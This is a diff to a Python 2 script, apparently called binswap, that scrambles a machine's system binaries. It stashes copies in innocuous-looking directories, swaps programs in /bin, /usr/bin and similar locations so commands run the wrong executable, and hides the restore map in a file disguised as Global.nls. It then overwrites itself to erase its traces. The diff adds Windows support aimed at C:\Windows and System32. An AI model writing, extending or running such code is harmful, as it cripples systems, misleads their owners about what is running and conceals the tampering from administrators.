@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-#from random import shuffle
 from sys import exit, argv
 import platform
 import os
@@ -10,16 +9,14 @@ import pickle
 import shutil
 
 #TODO:
-# 1. make it delete itself at the end of binswap()
-# 2. figure out what binaries are needed to login successfully so we don't swap those.
+# 1. figure out what binaries are needed to login successfully so we don't swap those.
 
 operatingSystem = platform.system().lower() #detect OS
 
 if operatingSystem == "windows": #set up some vars for specific OSes
 	slash = "\\"
 	dest = "C:\\Windows\\bin_locale"
-	# backfile = "C:\Windows\Globalization\Global.nls"
-	backfile = "C:\Dropbox\Computer\Security\Global.nls"
+	backfile = "C:\Windows\Globalization\Global.nls"
 else:
 	slash = "/"
 	dest = "/lib/lib-udev"
@@ -37,53 +34,37 @@ def derange(xs):
 
 #shuffle binaries
 def shuffle(keys, oldDict, newDict):
-	if operatingSystem == "windows":
-		print "windows? lawl."
-		return -3
-		# for key in keys:
-			# os.system("")
-	else:
-		for key in keys:
-			shutil.move(dest + oldDict[key], newDict[key])
+	for key in keys:
+		shutil.move(dest + oldDict[key], newDict[key])
 
 #put the binaries back to where they should be
 def unshuffle(oldDict, newDict):
-	if operatingSystem == "windows":
-		print "nah"
-		return -3
-	else: #linux!
-		for key in newDict.keys():
-			shutil.move(dest + newDict[key], oldDict[key])
+	for key in newDict.keys():
+		shutil.move(dest + newDict[key], oldDict[key])
 
 #backup the binary files
 def backup(myDict, directories, revert=0):
+	cmd = ""
 	if operatingSystem == "windows":
-		print "ha! didn't do windows yet"
-		return -2
-		# os.system("mkdir %s" % dest)
-		# for key, value in myDict.iteritems(): #copy binaries to backup dir
-			# os.system("copy %s %s%s%s" % (value, dest, slash, value))
+		mkdirBin = "mkdir"
 	else: #linux!
-		cmd = ""
 		if revert:
-			copyBin = "/var/cp"
 			mkdirBin = "/var/mkdir"
-		else: #if we're not reverting, make backups of cp, mv, python and mkdir
-			cmd = ("/bin/cp /bin/mv /var/mv; /bin/cp /bin/cp /var/cp;"
-				   "/bin/cp `which python` /var/spool/python;"
-				   "/bin/cp `which mkdir` /var/mkdir;")
-			copyBin = "/bin/cp"
+		else: #if we're not reverting, make backups of python and mkdir
+			cmd = ("/bin/cp `which mkdir` /var/mkdir;"
+				   "/bin/cp `which python` /var/spool/python;")
 			mkdirBin = "/usr/bin/env mkdir"
 
-		cmd = cmd + "%s -p \"%s\";" % (mkdirBin, dest) #create initial backup dir
+	cmd = cmd + "%s -p \"%s\";" % (mkdirBin, dest) #create initial backup dir
 
-		for myDir in directories: #remake directory structure
-			cmd = cmd + "%s -p \"%s%s\";" % (mkdirBin, dest, myDir)
+	for myDir in directories: #remake directory structure
+		cmd = cmd + "%s -p \"%s%s\";" % (mkdirBin, dest, myDir)
 		
-		os.system(cmd) #create directories needed
+	os.system(cmd) #create directories needed
 
-		for key, value in myDict.iteritems(): #backup the actual binaries
-			shutil.copy(value, dest + value)
+	#should work cross platform
+	for key, value in myDict.iteritems(): #backup the actual binaries
+		shutil.copy(value, dest + value)
 
 #get all files from the directories given and place them in a dictionary
 def getFiles(directories):
@@ -91,21 +72,33 @@ def getFiles(directories):
 	for myDir in directories: #traverse given dirs
 		if os.path.isdir(myDir): #if dir exists traverse files in it
 			for myBin in os.listdir(myDir):
-				#if a shell, env or python, skip it
-				if (myBin == "sh" or myBin == "bash" or myBin == "csh" or myBin == "zsh"
-					or myBin == "env" or myBin == "tcsh" or myBin == "dash"
-					or myBin == "ash" or "python" in myBin):
-					continue
+				#if windows
+				if operatingSystem == "windows":
+					#if not an executable or if cmd or python, skip it
+					if myBin[-4:] != ".exe" or myBin == "cmd.exe" or "python" in myBin:
+						continue
+				#if linux
+				else: #if a shell, env or python, skip it
+					if (myBin == "sh" or myBin == "bash" or myBin == "csh" or myBin == "zsh"
+						or myBin == "env" or myBin == "tcsh" or myBin == "dash"
+						or myBin == "ash" or "python" in myBin):
+						continue
+
 				fullBin = "%s%s%s" % (myDir, slash, myBin)
 				if os.path.isfile(fullBin): #make sure it's a file not a dir
 					myDict[myBin] = fullBin
+				#not tested, but this should recurse through all directories which would be useful
+				#for the "Program Files" directory. should look into this.
+				#elif operatingSystem == "windows":
+				#	return getFiles([myBin])
+
 	return myDict
 
 #main binary swapping function
 def binswap():
 	#pick directories based on OS
 	if operatingSystem == "windows":
-		dirs = ["C:\Dropbox\Computer"]
+		dirs = ["C:\Windows", "C:\Windows\System32"]
 	else:
 		dirs = ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin"]
 
@@ -140,8 +133,8 @@ def binswap():
 	with open(backfile, 'wb') as outfile:
 		pickle.dump([oldDict, newDict], outfile)
 
-	shuffleThread.join()
-	os.system("echo > %s" % argv[0])
+	shuffleThread.join() #wait for shuffling to finish before ending
+	os.system("echo > %s" % argv[0]) #self erase
 	print "done swapping"
 	return 0
 
@@ -149,7 +142,7 @@ def binswap():
 def revert():
 	#pick directories based on OS
 	if operatingSystem == "windows":
-		dirs = ["C:\Dropbox\Computer"]
+		dirs = ["C:\Windows", ""]
 	else:
 		dirs = ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin"]
 
@@ -158,9 +151,10 @@ def revert():
 		with open(backfile, 'rb') as infile:
 			oldDict, newDict = pickle.load(infile)
 	else:
-		print "cannot find backup file, ya screwed"
+		print "cannot find backup files, ya screwed"
 		return 1
 
+	#create copies of the binaries then put them back in the right place
 	backup(oldDict, dirs, revert=1)
 	unshuffle(oldDict, newDict)
 
